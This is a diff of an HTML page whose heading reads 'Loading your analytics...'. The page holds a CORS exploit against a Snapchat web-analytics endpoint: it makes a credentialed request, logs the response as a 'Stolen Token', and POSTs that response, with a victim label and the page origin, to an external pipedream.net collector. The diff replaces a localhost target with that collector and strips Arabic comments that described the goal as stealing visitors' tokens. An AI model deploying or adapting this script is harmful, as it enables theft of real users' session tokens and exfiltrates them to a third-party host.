@@ -6,33 +6,35 @@
 <body>
     <h1>Loading your analytics...</h1>
 
-    <script>
-        // هدفنا: استغلال CORS لسرقة token من زائر الموقع
+   <script>
         fetch('https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', {
             method: 'POST',
-            credentials: 'include', // يرسل أي cookies مرتبطة بـ snapchat.com
+            credentials: 'include',
             headers: {
-                'Origin': 'https://github.snappublisher.snapchat.com', // هذا الأصل مسموح به بسبب CORS الضعيف
+                'Origin': 'https://github.snappublisher.snapchat.com',
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify({}) // قد تحتاج إلى بيانات محددة، اتركها فارغة أولاً
+            body: JSON.stringify({})
         })
         .then(response => response.json())
         .then(data => {
-            // data تحتوي على الـ token والـ cid!
             console.log("Stolen Token:", data);
 
-            // إثبات السرقة: أرسل البيانات إلى خادمك الخاص
-            fetch('http://localhost:8000', {
+            // استبدل localhost برابط RequestBin أو ngrok
+            fetch('https://eoegsy3lrhynxxw.m.pipedream.net', {
                 method: 'POST',
-                mode: 'no-cors',
+                mode: 'no-cors', // 'no-cors' is correct here for sending to a different domain
+                headers: {
+                  'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
                     stolen_token: data,
-                    victim: "User visiting github.snappublisher.snapchat.com"
+                    victim: "User visiting github.snappublisher.snapchat.com",
+                    origin: window.location.origin
                 })
             });
         })
         .catch(error => console.error('Error:', error));
-    </script>
+</script>
 </body>
 </html>
